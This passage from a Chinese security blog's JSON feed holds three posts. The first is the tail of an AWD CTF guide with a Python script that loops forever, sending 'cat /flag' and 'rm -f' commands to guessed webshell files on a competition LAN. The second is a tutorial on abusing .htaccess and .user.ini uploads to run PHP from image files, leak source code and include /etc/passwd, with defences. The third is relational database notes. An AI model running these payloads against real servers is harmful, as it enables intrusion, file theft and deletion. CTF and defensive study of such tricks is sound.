丢分也相当于自己加分。</p>\n<p><pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">import</span> requests\n<span class=\"token keyword\">import</span> time\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">scan_attack</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token builtin\">file</span><span class=\"token operator\">=</span><span class=\"token punctuation\">&#123;</span><span class=\"token string\">'shell.php'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'x.php'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'index.php'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'web.php'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'1.php'</span><span class=\"token punctuation\">&#125;</span>\n    payload<span class=\"token operator\">=</span><span class=\"token punctuation\">&#123;</span><span class=\"token string\">'cat /flag'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'ls -al'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'rm -f'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'echo 1'</span><span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">while</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">8802</span><span class=\"token punctuation\">,</span> <span class=\"token number\">8804</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n            <span class=\"token keyword\">for</span> ii <span class=\"token keyword\">in</span> <span class=\"token builtin\">file</span><span class=\"token punctuation\">:</span>\n                url<span class=\"token operator\">=</span><span class=\"token string\">'http://192.168.76.156:'</span><span class=\"token operator\">+</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token string\">'/'</span><span class=\"token operator\">+</span>ii\n                <span class=\"token keyword\">for</span> iii <span class=\"token keyword\">in</span> payload<span class=\"token punctuation\">:</span>\n                    data<span class=\"token operator\">=</span><span class=\"token punctuation\">&#123;</span>\n                        <span class=\"token string\">'payload'</span><span class=\"token punctuation\">:</span>iii\n                    <span class=\"token punctuation\">&#125;</span>\n                    <span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span>\n                        requests<span class=\"token punctuation\">.</span>post<span class=\"token punctuation\">(</span>url<span class=\"token punctuation\">,</span>data<span class=\"token operator\">=</span>data<span class=\"token punctuation\">)</span>\n                        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"正在搅屎:\"</span><span class=\"token operator\">+</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token string\">'|'</span><span class=\"token operator\">+</span>ii<span class=\"token operator\">+</span><span class=\"token string\">'|'</span><span class=\"token operator\">+</span>iii<span class=\"token punctuation\">)</span>\n                        time<span class=\"token punctuation\">.</span>sleep<span class=\"token punctuation\">(</span><span class=\"token number\">0.5</span><span class=\"token punctuation\">)</span>\n                    <span class=\"token keyword\">except</span> Exception <span class=\"token keyword\">as</span> e<span class=\"token punctuation\">:</span>\n                        time<span class=\"token punctuation\">.</span>sleep<span class=\"token punctuation\">(</span><span class=\"token number\">0.5</span><span class=\"token punctuation\">)</span>\n                        <span class=\"token keyword\">pass</span>\n\n\n<span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">'__main__'</span><span class=\"token punctuation\">:</span>\n    scan_attack<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p>最后的最后，准备 - 漏洞资源 - 漏洞资料库（比赛能不能联网无法确定，如刚结束的河南省赛，虽然允许联网，但是大部分博客平台被加入了黑名单）</p>\n",
            "tags": [
                "Web",
                "Awd-web"
            ]
        },
        {
            "id": "https://blog.xcu.icu/2022/10/24/user.ini%E5%92%8Chtaccess%E6%96%87%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8/",
            "url": "https://blog.xcu.icu/2022/10/24/user.ini%E5%92%8Chtaccess%E6%96%87%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8/",
            "title": "user.ini和htaccess文件的利用",
            "date_published": "2022-10-23T16:00:00.000Z",
            "content_html": "<h2 id=\"htaccess文件的利用\"><a class=\"anchor\" href=\"#htaccess文件的利用\">#</a> .htaccess 文件的利用</h2>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9saW5rLmppYW5zaHUuY29tLz90PWh0dHA6Ly9odGFjY2Vzcy51dXouY2MvI2FfV1dX\">自动生成.htaccess 的网站</span></p>\n<p>分布式配置文件，它里面存放着 apache 服务器配置相关命令，提供了针对目录改变配置的方法，作用范围是当前目录及其子目录</p>\n<p>使用前，首先要启用 htacces，将 AllowOveride 的配置改为 all</p>\n<p><strong>AllowOverride 从字面上解释是允许覆盖的意思，即 Apache 允许另一配置文件覆盖现有配置文件。</strong></p>\n<p>在 AllowOverride 设置为 None 时， .htaccess 文件将被完全忽略。当此指令设置为 All 时，所有具有 “.htaccess” 作用域的指令都允许出现在 .htaccess 文件中。</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221019211017128.png\" alt=\"image-20221019211017128\" /></p>\n<h3 id=\"问题点一\"><a class=\"anchor\" href=\"#问题点一\">#</a> 问题点一</h3>\n<p>PHPStudy 中 AddType application/x-httpd-php 等 Apache 命令之所以在 Apache 的设置文件中设置后未实现目标效果是由于 PHP 的版本不符导致的，但注意这里的 PHP 版本并不是指 PHP7.3.0、PHP7.4.0 这种版本号，也不是适用于 32 位的 PHP、适用于 64 位的 PHP 这种不同机型的版本，而<strong>是 PHP 的 NTS (Non Thread Safe) 与 TS (Thread Safe) 的这种不同版本导致的</strong>。</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93aW5kb3dzLnBocC5uZXQvZG93bmxvYWQv\">PHP For Windows: Binaries and sources Releases</span></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221019230226348.png\" alt=\"\" /></p>\n<ol>\n<li><strong>ts(Thread-Safety)<strong> 即</strong>线程安全</strong>，多线程访问时，采用了加锁机制，当一个线程访问该类的某个数据时，进行保护，其他线程不能进行访问直到该线程读取完，其他线程才可使用。</li>\n<li><strong>nts(None-Thread Safe)<strong> 即</strong>非线程安全</strong>，就是不提供数据访问保护，有可能出现多个线程先后更改数据造成所得到的是 脏数据 php 以 fast cgi 方式运行的时候选择这个版本，具有更好的性能；</li>\n</ol>\n<h4 id=\"解决办法\"><a class=\"anchor\" href=\"#解决办法\">#</a> 解决办法</h4>\n<p>安装 TS 版本的 php，在 apache 配置中设置好</p>\n<p>在 php 文件夹中将 php.ini-development 文件复制一份命名为 php.ini</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221019234241421.png\" alt=\"image-20221019234241421\" /></p>\n<p>新下载的 php 本来没有现成的 php.ini 文件。只是给了</p>\n<p>php.ini-development （开发环境用）与 php.ini-production（生产环境用）两个建议。</p>\n<p>而 php 去加载 php.ini 作为配置文件的。我们更喜欢哪个建议，就把它备份，然后重命名为 php.ini 然后加入自己个性化的配置即可。</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221019234518254.png\" alt=\"image-20221019234518254\" /></p>\n<p>打开 php.ini，找到 extension_dir，并把前面的 &quot;;&quot; 符号删掉 (在 php.ini 相当于注释符)，其值改为 &quot;PHP 文件的路径 /ext&quot;。</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221019234918061.png\" alt=\"image-20221019234918061\" /></p>\n<p>他是放 php 扩展的目录，保存后，我们 PHP 就设置完成了，接下来要设置 Apache。</p>\n<p>来到 PHPStudy 安装 Apache 的目录下，打开 Apache 的配置文件 httpd.conf, 搜索 LoadModule，找到有很多 LoadModule 语句的地方。( <strong>LoadModule：加载特定的 DSO 模块。</strong>)</p>\n<p>在末尾加上 LoadModule php7_module &quot;PHP 文件的路径 /php7apache2_4.dll&quot; 和 PHPIniDir &quot;PHP 文件的路径&quot;。</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221019235835759.png\" alt=\"image-20221019235835759\" /></p>\n<p>再加上一句 AddType application/x-httpd-php .php，配置就完成了</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221020000146394.png\" alt=\"image-20221020000146394\" /></p>\n<h3 id=\"利用\"><a class=\"anchor\" href=\"#利用\">#</a> 利用</h3>\n<h5 id=\"文件解析\"><a class=\"anchor\" href=\"#文件解析\">#</a> 文件解析</h5>\n<p>首先还是先说文件上传中常用的利用方式</p>\n<p>(8.* 无法使用)</p>\n<p>在 htaccess 文件中写入如下内容，上传到服务端后再上传一个其他任意后缀的文件，都会被当作 php 文件解析</p>\n<p><pre class=\"line-numbers language-htaccess\" data-language=\"htaccess\"><code class=\"language-htaccess\">&lt;FilesMatch “.png”&gt;\nSetHandler application&#x2F;x-httpd-php\n&lt;&#x2F;FilesMatch&gt;\n#匹配文件中有haha存在\nSetHandler application&#x2F;x-httpd-php\n#SetHandler强制所有匹配的文件由指定处理程序处理\nAddType application&#x2F;x-httpd-php .txt\n#AddType将给定的文件扩展名映射到指定的内容类型<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221020180621597.png\" alt=\"image-20221020180621597\" /></p>\n<p>接着聊一聊别的利用方式</p>\n<h5 id=\"源码泄露\"><a class=\"anchor\" href=\"#源码泄露\">#</a> 源码泄露</h5>\n<p>当使用 PHP 作为 Apache 模块时，也可以用 Apache 的配置文件（例如 httpd.conf）和 .htaccess 文件中的指令来修改 php 的配置设定</p>\n<p>我们可以通过 .htaccess 文件的 php_value 指令对 PHP 的 engine 配置选项进行设定，当把 engine 的值设为 off（或 0）时可以禁用一个本目录和子目录中的 PHP 解析，此时将会造成源码泄露：</p>\n<p>在 htaccess 文件中写入</p>\n<p><pre class=\"line-numbers language-htaccess\" data-language=\"htaccess\"><code class=\"language-htaccess\">php_value engine 0<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221020210713349.png\" alt=\"image-20221020210713349\" /></p>\n<h5 id=\"文件包含\"><a class=\"anchor\" href=\"#文件包含\">#</a> 文件包含</h5>\n<p>htaccess 文件中同样有两个配置 auto_prepend_file 和 auto_append_file，我们可以通过 php_value 来设置，条件是同级目录下有 php 文件</p>\n<p><pre class=\"line-numbers language-htaccess\" data-language=\"htaccess\"><code class=\"language-htaccess\">php_value auto_append_file &#x2F;etc&#x2F;passwd<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221020211527232.png\" alt=\"image-20221020211527232\" /></p>\n<h5 id=\"防御\"><a class=\"anchor\" href=\"#防御\">#</a> 防御</h5>\n<p>最直接的就是过滤 htaccess 后缀</p>\n<p>对文件重命名（htaccess 文件命名固定）</p>\n<h2 id=\"userini的利用\"><a class=\"anchor\" href=\"#userini的利用\">#</a> user.ini 的利用</h2>\n<p>php.ini 是 php 的全局配置文件，只要是以 fastcgi 运行的 php 都可以用这个方法，对整个 web 环境起作用</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221018203121751.png\" alt=\"image-20221018203121751\" /></p>\n<p>user.ini 是用户自定义的 php.ini，如果在文件上传中没有对其进行限制，那么我们就可以修改 php.ini 的配置，既然是用户自定义，那么肯定要提到权限问题。</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221018204408073.png\" alt=\"image-20221018204408073\" /></p>\n<p>官方文档提到只有在这两种模式的 ini 设置可以被识别，那么就不得不提到什么是 PHP_INI_* 模式</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221018175831433.png\" alt=\"image-20221018175831433\" /></p>\n<p>这些模式决定着一个 PHP 的指令在何时何地，是否能够被设定。手册中的每个指令都有其所属的模式。例如有些指令可以在 PHP 脚本中用 ini_set () 来设定，而有些则只能在 php.ini 或 httpd.conf 中。(上面表格中没有提到的 PHP_INI_PERDIR 也可以在.user.ini 中设置)，user_ini.cache_ttl 控制着重新读取用户 INI 文件的间隔时间。默认是 300 秒（5 分钟）。</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221022120119084.png\" alt=\"image-20221022120119084\" /></p>\n<p><pre class=\"line-numbers language-none\"><code class=\"language-none\">PHP ini_set用来设置php.ini的值，在函数执行的时候生效，脚本结束后，设置失效。无需打开php.ini文件，就能修改配置<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre></p>\n<p>也就是说我们想利用.user.ini 需要在 PHP_INI_USER 模式（PHP_INI_ALL 模式）中，那么哪些配置可以在 <strong>.user.ini</strong> 中设定呢？</p>\n<blockquote>\n<p>php.ini 配置选项列表（<span class=\"exturl\" data-url=\"aHR0cDovL3BocC5uZXQvbWFudWFsL3poL2luaS5saXN0LnBocA==\">http://php.net/manual/zh/ini.list.php</span> ）</p>\n</blockquote>\n<h3 id=\"利用-2\"><a class=\"anchor\" href=\"#利用-2\">#</a> 利用</h3>\n<p>.user.ini 中两个中的配置就是 auto_prepend_file 和 auto_append_file。这两个配置的意思就是：我们指定一个文件（如 1.jpg，对后缀名没有太多要求），那么该文件就会被包含在要执行的 php 文件，相当于在 php 文件中中插入一句：require (./1.jpg)。这两个设置的区别只是在于 auto_prepend_file 是在文件前插入，auto_append_file 在文件最后插入 (文件后插入如果程序以 exit () 结束就无法利用)。</p>\n<p>demo：</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221018212902209.png\" alt=\"image-20221018212902209\" /></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221018212921996.png\" alt=\"image-20221018212921996\" /></p>\n<p>经过测试 php 版本从 5.3 开始到 7.4 都是可用的，php8.* 的没有成功</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221018213744658.png\" alt=\"image-20221018213744658\" /></p>\n<h3 id=\"防御-2\"><a class=\"anchor\" href=\"#防御-2\">#</a> 防御</h3>\n<p>利用条件：</p>\n<p><pre class=\"line-numbers language-none\"><code class=\"language-none\">服务器脚本语言为PHP 服务器使用CGI\nFastCGI模式\n上传目录下要有可执行的php文件<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre></p>\n<p>上面提到有 php8.* 是不可用的，那么可使用 php8.* 可用从根源解决问题</p>\n<p>user.ini 使用这两条条配置也有限制说了是在同目录下的其他.php 文件中包含配置中所指定的文件，也就是说需要该目录下存在.php 文件，不要将文件上传路径设置成为本目录下，存放上传文件的地方不要存有 php 文件（通常在文件上传中，一般是专门有一个目录用来存在图片，可能小概率会存在.php 文件。但是有时可以使用  <code>../</code>  来将文件上传到其他目录，达到一个利用的效果。）严格限制文件上传的路径</p>\n<p>再者结束对 ini 扩展名的过滤，对文件内容 auto_prepend_file、auto_append_file 的过滤</p>\n<h3 id=\"补充\"><a class=\"anchor\" href=\"#补充\">#</a> 补充</h3>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221022150904047.png\" alt=\"image-20221022150904047\" /></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221022150917949.png\" alt=\"image-20221022150917949\" /></p>\n<p>了解什么是 FastCGI，首先应该知道什么是 cgi</p>\n<p>全称是 “通用网关接口”，是一种让客户端（web 浏览器）与 Web 服务器（apache，nginx 等）程序进行通信（数据传输）的协议。</p>\n<h5 id=\"cgi工作流程\"><a class=\"anchor\" href=\"#cgi工作流程\">#</a> CGI 工作流程</h5>\n<ol>\n<li>每次当 web server 收到 index.php 这种类型的动态请求后，会启动对应的 CGI 程序 - PHP 的解析器；</li>\n<li>PHP 解析器会解析 php.ini 配置文件，初始化运行环境，然后处理请求，处理完成后将数据按照 CGI 规定的格式返回给 web server 然后退出进程；</li>\n<li>最后 web server 再把结果返回给浏览器。</li>\n</ol>\n<p>高并发时的性能较差：<br />\nCGI 程序的每一次 web 请求都会有启动和退出过程 —— 每次 HTTP 服务器遇到动态请求时都需要重新启动脚本解析器来解析 php.ini，重新载入全部 DLL 扩展并重初始化全部数据结构，然后把结果返回给 HTTP 服务器</p>\n<h5 id=\"fastcgi\"><a class=\"anchor\" href=\"#fastcgi\">#</a> FastCGI</h5>\n<p>因 CGI 高并发时性能差，未解决这一问题产生了 FastCGI</p>\n<h5 id=\"fastcgi工作流程\"><a class=\"anchor\" href=\"#fastcgi工作流程\">#</a> FastCGI 工作流程</h5>\n<ol>\n<li>Web Server 启动同时，加载 FastCGI 进程管理器</li>\n<li>FastCGI 进程管理器读取 php.ini 配置文件，对自身进行初始化，启动多个 CGI 解释器进程 (php-cgi)，等待来自 Web Server 的连接。</li>\n<li>当 Web Server 接收到客户端请求时，FastCGI 进程管理器选择并连接到一个 CGI 解释器。Web server 会将相关环境变量和标准输入发送到 FastCGI 子进程 php-cgi 进行处理</li>\n<li>FastCGI 子进程完成处理后将数据按照 CGI 规定的格式返回给 Web Server，然后关闭 FastCGI 子进程或者等待下一次请求。</li>\n</ol>\n<h5 id=\"fastcgi解决方案\"><a class=\"anchor\" href=\"#fastcgi解决方案\">#</a> FastCGI 解决方案</h5>\n<p>Master-Worker 模式</p>\n<p>Fastcgi 会先启一个 master，解析配置文件，初始化执行环境，然后再启动多个 worker。当请求过来时，master 会传递给一个 worker，然后立即可以接受下一个请求。这样就避免了重复的劳动，效率自然提高。而且当 worker 不够用时，master 可以根据配置预先启动几个 worker 等着；当然空闲 worker 太多时，也会停掉一些，这样就提高了性能，也节约了资源。这就是 fastcgi 的对进程的管理。</p>\n",
            "tags": [
                "Web",
                "文件上传"
            ]
        },
        {
            "id": "https://blog.xcu.icu/2022/10/24/%E5%85%B3%E7%B3%BB%E6%95%B0%E6%8D%AE%E5%BA%93/",
            "url": "https://blog.xcu.icu/2022/10/24/%E5%85%B3%E7%B3%BB%E6%95%B0%E6%8D%AE%E5%BA%93/",
            "title": "关系数据库",
            "date_published": "2022-10-23T16:00:00.000Z",
            "content_html": "<h2 id=\"21关系数据库结构及形式化定义\"><a class=\"anchor\" href=\"#21关系数据库结构及形式化定义\">#</a> 2.1 关系数据库结构及形式化定义</h2>\n<h3 id=\"211关系\"><a class=\"anchor\" href=\"#211关系\">#</a> 2.1.1 关系</h3>\n<p>单一的数据结构 -- 关系</p>\n<ul>\n<li>现实世界的实体以及实体之间的关系均用关系来表示</li>\n</ul>\n<p>逻辑结构 --- 二维表</p>\n<ul>\n<li>从用户角度，关系模型中数据的逻辑结构是一张二维表</li>\n</ul>\n<h4 id=\"域\"><a class=\"anchor\" href=\"#域\">#</a> 域</h4>\n<p>域是一组具有相同数据类型的值的集合</p>\n<ul>\n<li>整数、实数、自然数</li>\n<li>某一个范围的数</li>\n<li>指定长度的字符串集合</li>\n<li ’男‘，‘女’=\"\"></li>\n</ul>\n<h4 id=\"笛卡尔积\"><a class=\"anchor\" href=\"#笛卡尔积\">#</a> 笛卡尔积</h4>\n<ul>\n<li>\n<p>笛卡尔积</p>\n<p>给定一组域 D1，D2，…，Dn，这些域中可以有相同的。    D1，D2，…，Dn 的笛卡尔积为：    D1×D2×…×Dn ＝ ｛（d1，d2，…，dn）｜diDi，i＝1，2，…，n</p>\n<ol>\n<li>所有域的所有取值的一个组合</li>\n<li>不能重复</li>\n</ol>\n</li>\n<li>\n<p>元组</p>\n<p>笛卡尔积中每一个元素（d1，d2，…，dn）叫作一个 n 元组（n-tuple）或简称元组 (Tuple)</p>\n</li>\n<li>\n<p>分量</p>\n<p>笛卡尔积元素（d1，d2，…，dn）中的每一个值 di 叫作一个分量</p>\n</li>\n<li>\n<p>基数</p>\n<p>若 Di（i＝1，2，…，n）为有限集，其基数 (域中所包含的值的个数) 为 mi（i＝1，2，…，n），则 D1×D2×…×Dn 的基数 M 为：</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220918183227871.png\" alt=\"image-20220918183227871\" /></p>\n</li>\n<li>\n<p>笛卡尔积的表示方法</p>\n<ul>\n<li>笛卡尔积可以表示为一个二维表</li>\n<li>表中的每行对应一个元组，表中的每列对应一个域</li>\n</ul>\n</li>\n</ul>\n<h4 id=\"关系\"><a class=\"anchor\" href=\"#关系\">#</a> 关系</h4>\n<ol>\n<li>\n<p>关系<br />\n D1×D2×…×Dn 的子集叫作在域 D1，D2，…，Dn 上的关系，表示为 ：<br />\nR（D1，D2，…，Dn）</p>\n<ul>\n<li>\n<p>关系名</p>\n</li>\n<li>\n<p>关系的目或者度</p>\n</li>\n</ul>\n</li>\n<li>\n<p>单元关系于二元关系</p>\n<ul>\n<li>当 n=1 时，称该关系为单元关系或者一元关系</li>\n</ul>\n</li>\n<li>\n<p>关系的表示</p>\n<p>关系也是一个二维表，表的每行对应一个元组，表的每列对应一个域</p>\n</li>\n<li>\n<p>属性</p>\n<ul>\n<li>关系中不同列可以对应相同的域</li>\n<li>为了加以区分，必须对每列起一个名字，称为属性（Attribute）名</li>\n<li>n 目关系必有 n 个属性</li>\n</ul>\n</li>\n<li>\n<p>码</p>\n<ul>\n<li>候选码（Candidate key）：若关系中的某一属性组的值能唯一地标识一个元组，则称该属性组为候选码</li>\n<li>全码（All-key）：关系模式的所有属性是这个关系模式的候选码，称为全码</li>\n<li>主码（Primary key）：若一个关系有多个候选码，则选定其中一个为主码</li>\n<li>外部码：不是当前关系的码，但是其它关系的主码</li>\n<li>主属性：包含在任何候选码中的属性称为主属性。</li>\n<li>非主属性：不包含在任何侯选码中的属性称为非主属性（ Non-Prime attribute）或非码属性（Non-key attribute）</li>\n</ul>\n</li>\n<li>\n<p>三类关系</p>\n<ul>\n<li>\n<p>基本关系（基本表或者基表）</p>\n<p>实际存在的表，是实际存储数据的逻辑表示</p>\n</li>\n<li>\n<p>查询表</p>\n<p>查询结果对应的表</p>\n</li>\n<li>\n<p>视图表</p>\n<p>由基本表或者其他识图表导出的表，是虚表，不对应实际的数据</p>\n</li>\n</ul>\n</li>\n<li>\n<p>基本关系的性质</p>\n<ul>\n<li>列是同质的</li>\n<li>不同的列可以出自一个域<br />\n其中每个列称为一个属性<br />\n不同的属性要给与不同的属性名</li>\n<li>列的顺序无所谓，列的次序可以任意交换</li>\n<li>任意两个元组的候选码不能相同</li>\n<li>行的顺序无所谓，行的次序可以任意交换</li>\n<li>分量必须取原子值（最基本的）</li>\n</ul>\n</li>\n</ol>\n<h3 id=\"222-关系模式\"><a class=\"anchor\" href=\"#222-关系模式\">#</a> 2.2.2、关系模式</h3>\n<h4 id=\"什么是关系模型\"><a class=\"anchor\" href=\"#什么是关系模型\">#</a> 什么是关系模型</h4>\n<p>关系模式（型）</p>\n<ul>\n<li>对关系的描述</li>\n<li>静态的稳定的</li>\n</ul>\n<p>关系（值）</p>\n<ul>\n<li>关系模式在某一个时刻的状态或者内容</li>\n<li>动态的，随时间变化的</li>\n</ul>\n<p>关系是元组的集合，因此关系模式必须指出这个元组集合的结构，即它由哪些组成，这些属性来自哪些域，以及属性与域之间的映像关系。</p>\n<h4 id=\"定义关系模型\"><a class=\"anchor\" href=\"#定义关系模型\">#</a> 定义关系模型</h4>\n<p>关系模式可以形式化的表示为：</p>\n<p>​\tR（U，D，DOM，F）</p>\n<ul>\n<li>\n<p>R       关系名</p>\n</li>\n<li>\n<p>U       组成该关系的属性名集合</p>\n</li>\n<li>\n<p>D       属性组 U 中属性所来自的域</p>\n</li>\n<li>\n<p>DOM  属性向域的映象集合</p>\n</li>\n<li>\n<p>F        属性间的数据依赖关系集合</p>\n</li>\n</ul>\n<p>关系定义模式通常可以简记为</p>\n<p>R(U)</p>\n<p>关系模式何关系往往统称为关系</p>\n<h4 id=\"关系模型的存储结构\"><a class=\"anchor\" href=\"#关系模型的存储结构\">#</a> 关系模型的存储结构</h4>\n<ul>\n<li>关系模型的逻辑结构 - 表</li>\n<li>关系模型的物理结构\n<ol>\n<li>有的关系数据库管理中一个表对应一个操作系统文件，将物理数据组织交给操作系统完成；</li>\n<li>有的关系数据库系统从操作系统那里申请若干个大的文件，自己划分文件空间，组织表，索引等存储结构，并进行存储管理。</li>\n</ol>\n</li>\n</ul>\n<h3 id=\"223关系数据库\"><a class=\"anchor\" href=\"#223关系数据库\">#</a> 2.2.3 关系数据库</h3>\n<p>在一个给定的应用领域中，所有关系的集合构成一个关系数据库</p>\n<p>关系数据库也有型和值之分</p>\n<h2 id=\"22关系操作\"><a class=\"anchor\" href=\"#22关系操作\">#</a> 2.2 关系操作</h2>\n<h3 id=\"221-基本关系操作\"><a class=\"anchor\" href=\"#221-基本关系操作\">#</a> 2.2.1、基本关系操作</h3>\n<ol>\n<li>常用的关系操作\n<ul>\n<li>查询：选择、投影、连接、除、并、交、差、笛卡尔积</li>\n<li>数据更新：插入、删除、修改</li>\n<li>选择、投影、并、差、笛卡尔积是 5 种基本操作</li>\n</ul>\n</li>\n<li>关系操作的特点\n<ul>\n<li>集合操作方式：操作的对象和结果都是集合，一次一集合的方式</li>\n</ul>\n</li>\n</ol>\n<h3 id=\"222-关系数据库语言的分类\"><a class=\"anchor\" href=\"#222-关系数据库语言的分类\">#</a> 2.2.2、关系数据库语言的分类</h3>\n<ol>\n<li>\n<p>关系代数语言</p>\n<ul>\n<li>用对关系的运算来表达查询要求</li>\n<li>代表 ISBL</li>\n</ul>\n</li>\n<li>\n<p>关系演算语言：用谓词来表达查询要求</p>\n<ul>\n<li>\n<p>元组关系演算语言<br />\n谓词变元的基本对象是元组变量</p>\n<p>代表：APLHA, QUEL</p>\n</li>\n<li>\n<p>域关系演算语言</p>\n<p>谓词变元的基本对象是域变量</p>\n<p>代表：QBE</p>\n</li>\n</ul>\n</li>\n<li>\n<p>介于关系代数何关系演算之间的语言</p>\n<ul>\n<li>代表 SQL</li>\n</ul>\n</li>\n</ol>\n<p>每一个 ISBL 语句都近似于关系代数表达式<br />\n关系代数、关系演算语言均是抽象的查询语言，这些抽象的语言与具体的关系数据库管理系统中实现的实际语言并不完全一样。但它们能用作评估实际系统中查询语言能力的标准或基础。</p>\n<h2 id=\"23关系的完整性\"><a class=\"anchor\" href=\"#23关系的完整性\">#</a> 2.3 关系的完整性</h2>\n<h3 id=\"231-关系的三类完整性约束\"><a class=\"anchor\" href=\"#231-关系的三类完整性约束\">#</a> 2.3.1 关系的三类完整性约束</h3>\n<ol>\n<li>实体完整性何参照完整性<br />\n关系模型必须满足的完整性约束条件，称为关系的两个不变性，应该由关系系统自动支持</li>\n<li>用户定义完整性<br />\n应用领域需要遵循的约束条件，体现了具体领域中的语义约束</li>\n</ol>\n<h3 id=\"232-实体完整性\"><a class=\"anchor\" href=\"#232-实体完整性\">#</a> 2.3.2 实体完整性</h3>\n<p>(1) 实体完整性规则是针对基本关系而言的。一个基本表通常对应现实世界的一个实体集。</p>\n<p>(2) 现实世界中的实体是可区分的，即它们具有某种唯一性标识。</p>\n<p>(3) 关系模型中以主码作为唯一性标识。</p>\n<p>(4) 主码中的属性即主属性不能取空值。</p>\n<h3 id=\"233-参照完整性\"><a class=\"anchor\" href=\"#233-参照完整性\">#</a> 2.3.3 参照完整性</h3>\n<ol>\n<li>\n<p>关系间的引用</p>\n<p>在关系模型中实体及实体间的联系都是用关系来描     述的，因此可能存在着关系与关系间的引用。</p>\n</li>\n<li>\n<p>外码<br />\n外码：设 F 是基本关系 R 的一个或一组属性，但不是关系 R 的码。如果 F 与基本关系 S 的主码 Ks 相对应，则称 F 是基本关系 R 的外码。</p>\n<p><pre class=\"line-numbers language-none\"><code class=\"language-none\">基本关系R称为参照关系\n基本关系S称为被参照关系或目标关系<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre></p>\n</li>\n<li>\n<p>参照完整性规则<br />\n若属性（或属性组）F 是基本关系 R 的外码，它与基本关系 S 的主码 Ks 相对应（基本关系 R 和 S 不一定是不同的关系），则对于 R 中每个元组在 F 上的值必须为：<br />\n或者取空值（F 的每个属性值均为空值）<br />\n或者等于 S 中某个元组的主码值</p>\n</li>\n</ol>\n<h3 id=\"234-用户定义的完整性\"><a class=\"anchor\" href=\"#234-用户定义的完整性\">#</a> 2.3.4 用户定义的完整性</h3>\n<ul>\n<li>针对某一具体关系数据库的约束条件，反映某一具体应用所涉及的数据必须满足的语义要求</li>\n<li>关系模型应提供定义和检验这类完整性的机制，以便用统一的系统的方法处理它们，而不要由应用程序承担这一功能</li>\n</ul>\n<h2 id=\"24关系代数\"><a class=\"anchor\" href=\"#24关系代数\">#</a> 2.4 